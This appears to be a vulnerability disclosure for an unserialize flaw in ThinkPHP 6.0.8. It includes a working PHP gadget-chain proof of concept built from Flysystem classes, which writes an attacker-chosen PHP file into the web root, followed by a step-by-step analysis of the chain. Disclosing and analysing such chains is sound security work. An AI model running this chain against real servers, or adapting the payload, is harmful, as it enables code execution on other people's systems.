| thinkphp6.0.8 has a unserialize vulnerabilityVulnerability Demo Create Routing at `controller/Index.php`  ``` <?php namespace app\controller;  use app\BaseController;  class Index extends BaseController {     public function index()     {      if(isset($_POST['data'])){             @unserialize($_POST['data']);         }     }  } ```  this is my poc  ``` <?php    namespace League\Flysystem\Cached\Storage{      use League\Flysystem\Filesystem;      abstract class AbstractCache{         protected $autosave = false;       }     class Adapter extends AbstractCache     {         protected $adapter;         protected $file;          public function __construct(){             $this->complete = "*/<?php phpinfo();?>";             $this->expire = "yydsy4";             $this->adapter = new \League\Flysystem\Adapter\Local();             $this->file = "y4tacker.php";         }      } }  namespace League\Flysystem\Adapter{     class Local extends AbstractAdapter{      }     abstract class AbstractAdapter{         protected $pathPrefix;         public function __construct(){             $this->pathPrefix = "./";         }     } }   namespace {      use League\Flysystem\Cached\Storage\Adapter;     $a = new Adapter();     echo urlencode((serialize($a))); } ```  The file has been generated in the directory in public [2](https://user-images.githubusercontent.com/56486273/124283829-eb998080-db7e-11eb-915c-ad92bef40ec8.png)  and [3](https://user-images.githubusercontent.com/56486273/124283887-ffdd7d80-db7e-11eb-9036-8dca1d4f2f36.png) Vulnerability Analysis First one starts with \_\_destruct, autosave can be bypassed by assigning a value of true [4](https://user-images.githubusercontent.com/56486273/124283974-1aaff200-db7f-11eb-8076-6d6f6569bb15.png)  Next we call the save method, because this is an abstract class so we need to find the method that implements it  ``` abstract class AbstractCache implements CacheInterface  ```  Here I choose `vendor\league\flysystem-cached-adapter\src\Storage\Adapter.php`  `adapter` variables are controllable and it feels like write may have a write operation so we globally search for the write method  [5](https://user-images.githubusercontent.com/56486273/124284093-374c2a00-db7f-11eb-9126-64502e8f1933.png)  finally at `vendor\league\flysystem\src\Adapter\Local.php`  [6](https://user-images.githubusercontent.com/56486273/124284110-3b784780-db7f-11eb-8ff7-a7838058995d.png)  The `has` method determines if the value in the `location` variable is an existing file, in order to bypass it we need a non-existent file name, the path is completely controllable  [7](https://user-images.githubusercontent.com/56486273/124284131-4206bf00-db7f-11eb-9176-a16ebab32138.png)  And this one happens to have the file\_put\_contents method in it  [8](https://user-images.githubusercontent.com/56486273/124284164-4af79080-db7f-11eb-9f16-0d0c4e5ce640.png)  The value of contents comes from what we passed in earlier and can see is `$this->getForStorage();`  [9](https://user-images.githubusercontent.com/56486273/124284193-534fcb80-db7f-11eb-89ff-37473bef2685.png)  The parameters are all controllable, but we need to bypass the `json_encode` method, otherwise if we pass in escape symbols it will also output [10](https://user-images.githubusercontent.com/56486273/124284220-5ba80680-db7f-11eb-85a6-c996ef26f7f7.png)  Here I pass in `*/<?php phpinfo();? >` will be commented out in front and followed by `? >` is separated, causing the vulnerability, analysis is complete |
